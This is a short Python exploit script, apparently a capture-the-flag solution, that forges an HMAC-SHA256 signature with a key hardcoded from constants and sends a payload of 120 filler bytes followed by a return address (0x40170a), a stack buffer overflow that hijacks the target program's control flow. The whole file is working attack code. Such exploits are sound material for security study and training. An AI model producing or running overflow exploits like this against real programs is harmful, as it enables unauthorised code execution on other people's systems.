#!/usr/bin/env python3

import sys
import hmac
import hashlib

key = 0xb307646d9b5a310f.to_bytes(8, 'little') + 0x965c92031e04c47e.to_bytes(8, 'little') + 0xd5017affd6305682.to_bytes(8, 'little') + 0x4588031b50e2e97c.to_bytes(32, 'little')

sys.stdout.buffer.write(0x80.to_bytes(8, 'little'))
message = b'A'*120 + 0x000000000040170a.to_bytes(8, 'little')
sys.stdout.buffer.write(message)

hmac_obj = hmac.new(key, message, hashlib.sha256)
print(hmac_obj.digest())
sys.stdout.buffer.write(hmac_obj.digest())

# (void *)hmac_sha256(&local_38,0x20,param_1,param_2);
